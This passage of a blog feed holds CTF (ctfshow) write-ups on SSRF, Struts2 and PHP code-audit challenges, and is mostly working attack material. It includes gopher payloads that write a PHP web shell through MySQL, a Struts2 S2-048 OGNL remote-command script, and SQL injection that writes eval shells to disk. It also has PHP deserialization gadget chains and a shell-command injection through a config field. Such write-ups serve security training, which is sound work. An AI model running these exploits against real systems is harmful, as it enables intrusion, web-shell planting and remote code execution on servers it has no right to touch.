\"file:///flag\"&gt;\n]&gt;\n&lt;user&gt;\n&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/fe1aa8c3/",
            "url": "http://dpm12345.cn/posts/fe1aa8c3/",
            "title": "XSS",
            "date_published": "2023-03-20T12:15:40.000Z",
            "content_html": "<h1 id=\"web-316\"><a href=\"#web-316\" class=\"headerlink\" title=\"web 316\"></a>web 316</h1>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/813434ca/",
            "url": "http://dpm12345.cn/posts/813434ca/",
            "title": "SSRF",
            "date_published": "2023-03-16T14:12:40.000Z",
            "content_html": "<h1 id=\"web-351\"><a href=\"#web-351\" class=\"headerlink\" title=\"web 351\"></a>web 351</h1><p>网页目录下有flag.php，访问后返回非本地用户无法访问</p>\n<p>于是post参数url <code>url=http://127.0.0.1/flag.php</code></p>\n<p>得到flag</p>\n<h1 id=\"web-352\"><a href=\"#web-352\" class=\"headerlink\" title=\"web 352\"></a>web 352</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127.0.0/')){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt; \n</code></pre>\n<p>限定”http”/“https”，且过滤了<code>127.0.0</code>和<code>localhost</code>，这涉及到<code>127.0.0.1</code>的他种写法</p>\n<p>有很多如<code>0</code>，<code>127.1</code>,<code>127.0.1</code>,`</p>\n<p>或者进制转换</p>\n<p>或者写个重定向的网页</p>\n<h1 id=\"web-353\"><a href=\"#web-353\" class=\"headerlink\" title=\"web 353\"></a>web 353</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127\\.0\\.|\\。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>同上题,使用<code>127.1</code>,<code>0</code>等</p>\n<h1 id=\"web-354\"><a href=\"#web-354\" class=\"headerlink\" title=\"web 354\"></a>web 354</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|1|0|。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>不能出现<code>localhost</code>,<code>1</code>,<code>0</code>,<code>。</code>等字符</p>\n<p>故这里使用302跳转重定向或改本地域名的A记录到127.0.0.1上</p>\n<h1 id=\"web-355\"><a href=\"#web-355\" class=\"headerlink\" title=\"web 355\"></a>web 355</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)&lt;=5)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>要求长度小于5，那么可以使用<code>127.1</code>,<code>0</code></p>\n<h1 id=\"web-356\"><a href=\"#web-356\" class=\"headerlink\" title=\"web 356\"></a>web 356</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)&lt;=3)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>长度小于3.使用<code>0</code></p>\n<h1 id=\"web-357\"><a href=\"#web-357\" class=\"headerlink\" title=\"web 357\"></a>web 357</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$ip = gethostbyname($x['host']);\necho '&lt;/br&gt;'.$ip.'&lt;/br&gt;';\nif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {\n    die('ip!');\n}\n\n\necho file_get_contents($_POST['url']);\n}\nelse{\n    die('scheme');\n}\n?&gt;\n</code></pre>\n<p>302跳转</p>\n<h1 id=\"web-358\"><a href=\"#web-358\" class=\"headerlink\" title=\"web 358\"></a>web 358</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){\n    echo file_get_contents($url);\n}\n</code></pre>\n<p>payload:<code>http://ctf.@127.0.0.1/flag.php?show</code></p>\n<h1 id=\"web-359\"><a href=\"#web-359\" class=\"headerlink\" title=\"web 359\"></a>web 359</h1><p>利用</p>\n<pre><code class=\"raw\">Give MySQL username: root                                                                          \nGive query to execute: select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01\n</code></pre>\n<p>在<code>check.php</code>上post参数<code>returl=xxx</code>，其中下划线后面的要url编码，使网站目录下生成含一句话木马的<code>1.php</code></p>\n<h1 id=\"web-360\"><a href=\"#web-360\" class=\"headerlink\" title=\"web 360\"></a>web 360</h1><p>根据题目提示，打redis</p>\n<pre><code class=\"raw\">What do you want?? (ReverseShell/PHPShell): PHPShell\n\nGive web root location of server (default is /var/www/html):                                       \nGive PHP Payload (We have default PHP Shell): &lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<p>访问<code>shell.php</code>，然后正常rce</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7f1ae6d2/",
            "url": "http://dpm12345.cn/posts/7f1ae6d2/",
            "title": "java",
            "date_published": "2023-03-16T14:12:40.000Z",
            "content_html": "<h1 id=\"web-279-294-296-297\"><a href=\"#web-279-294-296-297\" class=\"headerlink\" title=\"web 279-294 296-297\"></a>web 279-294 296-297</h1><p>脚本通杀 下载 下载链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hhdEJveS9TdHJ1dHMyLVNjYW4=\">https://github.com/HatBoy/Struts2-Scan</span><br>具体用法在md文件中，例如<br>检测<br><code>python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action</code><br>利用<br><code>python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec</code><br>执行命令env即可得到flag</p>\n<h1 id=\"web-295\"><a href=\"#web-295\" class=\"headerlink\" title=\"web 295\"></a>web 295</h1><p>漏洞点在：<span class=\"exturl\" data-url=\"aHR0cDovLzg0NmNlMzM0LTU5ZDAtNGRjMS1iNzhkLTE5NDA4OWFjM2JlOS5jaGFsbGVuZ2UuY3RmLnNob3cvUzItMDQ4L2ludGVncmF0aW9uL3NhdmVHYW5nc3Rlci5hY3Rpb24=\">http://846ce334-59d0-4dc1-b78d-194089ac3be9.challenge.ctf.show/S2-048/integration/saveGangster.action</span></p>\n<pre><code class=\"python\">import json,re\nimport requests\nimport threading\nimport urllib.parse\nimport base64\n\ndef Poc(url,command):\n    header = {'Content-Type': 'application/x-www-form-urlencoded'}\n    poc = {\"name\":\"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \\\n                          \"+command+\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}\",\"age\":\"1\",\"__checkbox_bustedBefore\":\"true\",\"description\":\"123123\"}\n    data = urllib.parse.urlencode(poc)\n    try:\n        result = requests.post(url,data=data,headers=header)\n        if result.status_code == 200:\n            \n            print(result.content)\n    except requests.ConnectionError as e:\n        print(e)\n\nth = {\"url\":\"\"}\n\nwhile True:\n    if th.get(\"url\") != \"\":\n        input_cmd = input(\"cmd &gt;&gt;: \")\n        if input_cmd == \"exit\":\n            exit()\n        elif input_cmd == 'set':\n            url = input(\"set url :\")\n            th['url'] = url\n        elif input_cmd == 'show url':\n            print(th.get(\"url\"))\n        else:\n            Poc(th.get(\"url\"),input_cmd)\n    else:\n        url = input(\"set url :\")\n        th[\"url\"] = url\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/9e150aa2/",
            "url": "http://dpm12345.cn/posts/9e150aa2/",
            "title": "代码审计",
            "date_published": "2023-01-15T14:53:15.000Z",
            "content_html": "<h1 id=\"web-301\"><a href=\"#web-301\" class=\"headerlink\" title=\"web 301\"></a>web 301</h1><p>下载源码文件，发现在<code>checklogin.php</code>文件中的sql查询语句没有过滤</p>\n<pre><code class=\"php\">$sql=\"select sds_password from sds_user where sds_username='\".$username.\"' order by id limit 1;\";\n</code></pre>\n<p>而<code>$username</code>是可控的，故可以用sqlmap爆破出密码，或者写一句话木马文件</p>\n<h2 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h2><p>运行脚本</p>\n<pre><code class=\"bash\">python sqlmap.py -u http://392cb8ff-78e8-4004-9117-6a9a0d378c35.challenge.ctf.show/checklogin.php --form --batch --dump\n</code></pre>\n<p>所花时间比较长，需要等待</p>\n<p>最后得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web301_sqlmap.jpg\" alt=\"sqlmap结构结果\" title=\"运行结果\"></p>\n<p>username：<code>admin</code></p>\n<p>password： <code>ctfshowwwww</code></p>\n<p>登录成功后跳转到<code>index.php</code></p>\n<p>可以看到flag</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web301_sqlmap_result.jpg\"></p>\n<h2 id=\"写一句话\"><a href=\"#写一句话\" class=\"headerlink\" title=\"写一句话\"></a>写一句话</h2><p>根据原SQL语句的结构，注入位置为<code>where</code>后，首先需要闭合单引号<code>'</code>，再由此进行联合查询写文件,最后再过滤即可</p>\n<pre><code class=\"sql\">' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#\n</code></pre>\n<p>于是在登陆界面</p>\n<p>username: <code>' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#</code></p>\n<p>password: <code>1</code></p>\n<p>点击登录后，可以发现停在<code>checklogin.php</code>，可知sql语句执行成功</p>\n<p>访问<code>1.php</code>，报错<code>Notice: Undefined offset: 1 in /var/www/html/1.php on line 1</code></p>\n<p><code>1=system('ls')</code>可以看到flag.php</p>\n<p><code>1=system('tac flag.php');</code>得到flag</p>\n<p><code>ctfshow{be6425ec-a5f6-4afb-b76f-104b34576198}</code></p>\n<h1 id=\"web-302\"><a href=\"#web-302\" class=\"headerlink\" title=\"web 302\"></a>web 302</h1><p>题目提示</p>\n<pre><code class=\"php\">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){\n</code></pre>\n<p>但sql语句在之前已经执行，因此同样可以采用上面的两种方法</p>\n<h1 id=\"web-303\"><a href=\"#web-303\" class=\"headerlink\" title=\"web 303\"></a>web 303</h1><p>根据题目所给的源码，在<code>dptadd.php</code>中找到注入点</p>\n<pre><code class=\"php\">$sql=\"insert into sds_dpt set sds_name='\".$dpt_name.\"',sds_address ='\".$dpt_address.\"',sds_build_date='\".$dpt_build_year.\"',sds_have_safe_card='\".$dpt_has_cert.\"',sds_safe_card_num='\".$dpt_cert_number.\"',sds_telephone='\".$dpt_telephone_number.\"';\";\n</code></pre>\n<p>而在这一sql语句中，没有任何的过滤</p>\n<p>而要进入这一段代码的执行，可以看到，<code>if(!isset($_SESSION['login']))</code>，即需要先登录成功</p>\n<p>再次查看源码，在<code>sds_user.sql</code>文件中，有这样一条信息</p>\n<pre><code class=\"sql\">INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');\n</code></pre>\n<p>也就是说，我们知道了一个账户的账号和密码，因此可以借此登录。但很明显，密码为密文形式，需要解出明文</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){\n    $_SESSION['login']=1;\n    $result-&gt;free();\n    $mysqli-&gt;close();\n    header(\"location:index.php\");\n    return;\n}\n</code></pre>\n<p>也就是说，只有<code>sds_decode($userpwd)</code>与<code>$row['sds_password']</code>相等才可以登陆成功，已知<code>$row['sds_password']</code>为<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>查看<code>sds_decode</code>方法的定义，在<code>fun.php</code>中</p>\n<pre><code class=\"php\">&lt;?php\nfunction sds_decode($str){\n    return md5(md5($str.md5(base64_encode(\"sds\"))).\"sds\");\n}\necho sds_decode(\"admin\");\n?&gt;\n</code></pre>\n<p>尝试用该方法的逆向过程解密，但发现<code>27151b7b1ad51a38ea66b1529cde5ee4</code>解不了</p>\n<p>看到<code>echo sds_decode(\"admin\");</code>，尝试运行，会发现输出的内容恰好为<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>于是得知一个账户的账号和密码，均为<code>admin</code></p>\n<p>当执行成功后，会跳转到<code>dpt.php</code></p>\n<p>而<code>dpt.php</code>中有</p>\n<pre><code class=\"php\">&lt;?php\n//注入点\n$_GET['id']=!empty($_GET['id'])?$_GET['id']:NULL;\n$page=$_GET['id'];\n                        \n                                \n$sql=\"select * from sds_dpt order by id;\";\n$result=$mysqli-&gt;query($sql);\n?&gt;\n</code></pre>\n<p>也即可以利用这一页面来查看添加的值，于是查表payload</p>\n<p><code>dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_1.jpg\"></p>\n<p><code>sds_dpt,sds_fl9g,sds_user</code></p>\n<p>猜测在表<code>sds_fl9g</code></p>\n<p>查列payload:<code>dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sds_fl9g')%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_2.jpg\"></p>\n<p><code>flag</code></p>\n<p>查值payload：<code>dpt_name=1',sds_address=(select group_concat(flag) from sds.sds_fl9g)%23</code>(数据库名<code>sds</code>可以从源码中的<code>conn.php</code>找到，也可以查)</p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_3.jpg\"></p>\n<h1 id=\"web-304\"><a href=\"#web-304\" class=\"headerlink\" title=\"web 304\"></a>web 304</h1><p>说添加了waf，但实际没有，同上面方法，除表名改为<code>sds_flaag</code>，其他不变</p>\n<h1 id=\"web-305\"><a href=\"#web-305\" class=\"headerlink\" title=\"web 305\"></a>web 305</h1><p>此题增加了waf，不能像上两题一样解题，但很明显多了个<code>class.php</code>文件，查看</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-17 13:20:37\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-17 13:33:21\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nclass user{\n    public $username;\n    public $password;\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __destruct(){\n        file_put_contents($this-&gt;username, $this-&gt;password);\n    }\n}\n</code></pre>\n<p>看到</p>\n<pre><code class=\"php\">public function __destruct(){\n    file_put_contents($this-&gt;username, $this-&gt;password);\n}\n</code></pre>\n<p>看起来是反序列化</p>\n<p>再看<code>checklogin.php</code>，看到</p>\n<pre><code class=\"php\">$user_cookie = $_COOKIE['user'];\nif(isset($user_cookie)){\n    $user = unserialize($user_cookie);\n}\n</code></pre>\n<p>没有任何限制，也就是只要创建一个反序列化对象即可，然后通过<code>$COOKIE['user']</code>传递，最后点击登录，便能执行反序列化</p>\n<pre><code class=\"php\">&lt;?php\nclass user{\n    public $username;\n    public $password;\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __destruct(){\n        file_put_contents($this-&gt;username, $this-&gt;password);\n    }\n}\n\n$a = new user('1.php','&lt;?php eval($_POST[1]);?&gt;');\necho urlencode(serialize($a));\n</code></pre>\n<p>按以上操作后，访问<code>1.php</code></p>\n<p>可以看到报错，使用蚁剑连接数据库</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_305.jpg\"></p>\n<p>数据库类型为<code>MYSQLI</code>，密码为<code>root</code>(该密码可在蚁剑文件界面的<code>conn.php</code>找到，与下载来的源码文件不同)</p>\n<p>通过查表，得到flag在<code>sds.sds_flabag</code></p>\n<h1 id=\"web-306\"><a href=\"#web-306\" class=\"headerlink\" title=\"web 306\"></a>web 306</h1><p>查看代码，发现<code>index.php</code>有反序列化操作</p>\n<pre><code class=\"php\">$user = unserialize(base64_decode($_COOKIE['user']));\nif(!$user){\n    header(\"location:login.php\");\n}\n</code></pre>\n<p>于是查找其他文件，寻找<code>__wakeup()``__destruct</code>方法或者可以写文件之类的函数，如<code>file_put_contents</code></p>\n<p>最后可在<code>class.php</code>中找到</p>\n<pre><code class=\"php\">class log{\n    public $title='log.txt';\n    public $info='';\n    public function loginfo($info){\n        $this-&gt;info=$this-&gt;info.$info;\n    }\n    public function close(){\n        file_put_contents($this-&gt;title, $this-&gt;info);\n    }\n}\n</code></pre>\n<p>只要构造一个log类对象，然后调用<code>close()</code>方法，便能写文件</p>\n<p>查找所有文件的类中是否有调用<code>close()</code>的方法</p>\n<p>在<code>dao.php</code>中找到</p>\n<pre><code class=\"php\">class dao{\n    private $config;\n    private $conn;\n\n    public function __construct(){\n        $this-&gt;config=new config();\n        $this-&gt;init();\n    }\n    private function init(){\n        $this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());\n    }\n    public function __destruct(){\n        $this-&gt;conn-&gt;close();\n    }\n\n    public function get_user_password_by_username($u){\n        $sql=\"select sds_password from sds_user where sds_username='\".$u.\"' order by id limit 1;\";\n        $result=$this-&gt;conn-&gt;query($sql);\n        $row=$result-&gt;fetch_array(MYSQLI_BOTH);\n        if($result-&gt;num_rows&gt;0){\n            return $row['sds_password'];\n        }else{\n            return '';\n        }\n    }\n\n}\n</code></pre>\n<p>当其<code>__destruct</code>时即可执行，但由于以其本身创建的<code>$this-&gt;conn</code>为<code>mysqli</code>对象，故需要想方法使其为<code>log</code>对象</p>\n<p>好在该文件<code>require \"class.php\"</code>，故可以构造时就使其为<code>log</code>对象</p>\n<p>而在<code>index.php</code>，又也<code>require \"dao.php\"</code></p>\n<p>故代码为</p>\n<pre><code class=\"php\">&lt;?php\nclass dao{\n    private $config;\n    private $conn;\n    public function __construct($u){\n        $this-&gt;conn=$u;\n    }\n}\n\nclass log{\n    public $title='1.php';\n    public $info='&lt;?php eval($_POST[1]);?&gt;';\n}\n\n$a = new dao(new log());\necho urlencode(base64_encode(serialize($a)));\n</code></pre>\n<p>payload为<code>TzozOiJkYW8iOjI6e3M6MTE6IgBkYW8AY29uZmlnIjtOO3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</code></p>\n<p>填写cookie后，访问<code>index.php</code>，再访问<code>1.php</code>，得到报错<strong>Notice</strong>: Undefined offset: 1 in <strong>/var/www/html/1.php</strong> on line <strong>1</strong></p>\n<p><code>1=system('ls');</code>后发现有<code>flag.php</code>，<code>1=system('tac flag.php');</code>，得到flag</p>\n<h1 id=\"web-307\"><a href=\"#web-307\" class=\"headerlink\" title=\"web 307\"></a>web 307</h1><p>查询反序列化路口，可以找到四个，其中三个只有反序列化，一个为反序列化后，并调用了其<code>clearCache()</code>方法</p>\n<p>查看所有的类，之前能用的<code>__destruct</code>中<code>close()</code>，由于<code>log</code>类的对应写文件方法为<code>closelog()</code>，故该方法失效，所以只能选用<code>logout.php</code>中的反序列化，调用<code>clearCache()</code>方法</p>\n<p>查看所有拥有<code>clearCache()</code>方法的类，为<code>dao</code>和<code>service</code>，而<code>service</code>最终调用的也为<code>dao</code>类中的<code>clearCache()</code>方法</p>\n<pre><code class=\"php\">public function  clearCache(){\n    shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');\n}\n</code></pre>\n<p>故只需巧妙构造一个<code>$this-&gt;config-&gt;cache_dir</code>便可执行系统命令</p>\n<p>而对于<code>config</code>类</p>\n<pre><code class=\"php\">class config{\n    private $mysql_username='root';\n    private $mysql_password='phpcj';\n    private $mysql_db='sds';\n    private $mysql_port=3306;\n    private $mysql_host='localhost';\n    public $cache_dir = 'cache';\n\n    public function get_mysql_username(){\n        return $this-&gt;mysql_username;\n    }\n    public function get_mysql_password(){\n        return $this-&gt;mysql_password;\n    }\n    public function get_mysql_port(){\n        return $this-&gt;mysql_port;\n    }\n    public function get_mysql_db(){\n        return $this-&gt;mysql_db;\n    }\n    public function get_mysql_host(){\n        return $this-&gt;mysql_host;\n    }\n}\n</code></pre>\n<p>只需修改<code>public $cache_dir = 'cache';</code>项</p>\n<p>故现在有两个选项，序列化<code>dao</code>和序列化<code>service</code></p>\n<p>但由于<code>service</code>类存在<code>__wakeup()</code>方法，再进行反序列化操作前，会调用此方法</p>\n<pre><code class=\"php\">public function __wakeup(){\n    $this-&gt;config=new config();\n    $this-&gt;dao=new dao();\n}\n</code></pre>\n<p>也即此时的<code>config</code>和<code>dao</code>都会刷新，那么<code>dao</code>中的构造好的<code>config</code>也会刷新，从而丢失构造好的数据，故只能选用<code>dao</code>序列化</p>\n<p>代码如下</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    private $mysql_username='root';\n    private $mysql_password='phpcj';\n    private $mysql_db='sds';\n    private $mysql_port=3306;\n    private $mysql_host='localhost';\n    public $cache_dir = 'x;echo \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\";echo ';\n}\nclass dao{\n    private $config;\n    private $conn;\n    public function __construct($u){\n        $this-&gt;config=$u;\n    }\n}\n\n$a = new dao(new config());\necho urlencode(base64_encode(serialize($a)));\n</code></pre>\n<p>访问<code>controller/logout.php</code>，自动跳转到<code>login.php</code>后，访问<code>1.php</code>，之后分别输入<code>1=system('ls')</code>和<code>1=system('tac flag.php')</code>得到flag</p>\n<h1 id=\"web-308\"><a href=\"#web-308\" class=\"headerlink\" title=\"web 308\"></a>web 308</h1><p>相较于上题，<code>clearCache()</code>方法添加了正则匹配</p>\n<pre><code class=\"php\">public function  clearCache(){\n    if(preg_match('/^[a-z]+$/i', $this-&gt;config-&gt;cache_dir)){\n        shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');\n    }\n}\n</code></pre>\n<p>输入的目录只允许存在字母，这里便不利于使用，放弃该利用点</p>\n<p>在<code>fun.php</code>中存在ssrf</p>\n<pre><code class=\"php\">function checkUpdate($url){\n        $ch=curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_HEADER, false);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); \n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        $res = curl_exec($ch);\n        curl_close($ch);\n        return $res;\n    }\n</code></pre>\n<p>而这函数在<code>dao</code>类的<code>checkVersion</code>方法中出现</p>\n<pre><code class=\"php\">public function checkVersion(){\n    return checkUpdate($this-&gt;config-&gt;update_url);\n}\n</code></pre>\n<p>而<code>checkVersion</code>在<code>index.php</code>中被调用</p>\n<pre><code class=\"php\">$service = unserialize(base64_decode($_COOKIE['service']));\nif($service){\n    $lastVersion=$service-&gt;checkVersion();\n}\n</code></pre>\n<p>poc</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>其中<code>$update_url</code>由gopherus生成</p>\n<p>由于从代码可知为mysql，故生成命令</p>\n<pre><code class=\"raw\">python2 gopherus.py --exploit mysql\nroot\nselect \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"\n</code></pre>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web308.jpg\"></p>\n<p>最后访问<code>1.php</code>，拿到shell，获取flag</p>\n<h1 id=\"web-309\"><a href=\"#web-309\" class=\"headerlink\" title=\"web 309\"></a>web 